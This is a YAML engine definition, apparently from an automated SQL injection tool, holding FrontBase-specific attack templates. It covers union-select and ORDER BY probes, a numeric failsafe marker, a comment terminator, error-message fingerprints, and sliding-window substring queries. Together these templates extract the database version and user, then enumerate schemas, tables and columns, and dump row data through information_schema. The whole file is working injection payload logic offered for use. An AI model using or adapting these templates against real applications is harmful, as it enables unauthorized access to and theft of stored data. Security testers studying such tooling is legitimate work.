engine: Frontbase

resource:
 info: |
  'version()'
  || '${enclose_value_sql}'
  || 'database()'
  || '${enclose_value_sql}'
  || 'user()'
  || '${trail_sql}'

 schema:
  database: |
   select
       substring(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           || '${trail_sql}'
           from ${window.char}
           for ${capacity}
       )
   from (
       select
           "schema_name" r,
           count("table_name") q
       from information_schema.tables t
       right join information_schema.schemata s
       on t."schema_pk" = s."schema_pk"
       group by r
       ${limit}
   ) x

  table: |
   select
       substring(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           || '${trail_sql}'
           from ${window.char}
           for ${capacity}
       )
   from (
       select
           "table_name" r,
           '0' q
       from information_schema.tables t
       right join information_schema.schemata s
       on t."schema_pk" = s."schema_pk"
       where s."schema_name" = '${database}'
   ) x
   ${limit}

  column: |
   select
       substring(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || '0'
           || '${enclose_value_sql}'
           || '${trail_sql}'
           from ${window.char}
           for ${capacity}
       )
   from (
       select
           "column_name" r,
           '0' q
       from information_schema.columns as "c"
       inner join information_schema.tables as "t" using("table_pk")
       inner join information_schema.schemata as "s" using("schema_pk")
       where s."schema_name" = '${database}'
       and t."table_name" = '${table}'
   ) x
   ${limit}

  row:
   query: |
    select
        substring(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || q
            || '${enclose_value_sql}'
            from ${window.char}
            for ${capacity}
       )
       ||'${trail_sql}'
    from (
        select
            ${fields} r,
            '0' q
        from ${database}.${table}
    ) x
    ${limit}
   fields:
    field: coalesce("${field.value}",'')
    concat: "||'%7f'||"

strategy:
 configuration:
  slidingWindow: |
   (
       select top 1
           '${lead}'
           ||
           (${injection})
       from information_schema.schemata
   )
  limit: limit ${limit.value}, 1
  failsafe: trim(cast(1337${indice}7330%2b1 as char(100)))
  calibrator: "'${calibrator_raw}'"
  limitBoundary: 0
  endingComment: '--+-'
  fingerprint:
   errorMessage:
    - Frontbase
   orderByErrorMessage:
    - Illegal sort specification in ORDER BY

 union:
  indices: union select top 1 ${indices} from information_schema.schemata
  capacity: |
   '${lead}'
   || '${indice}'
   || ${calibrator}
  orderBy: order by 1337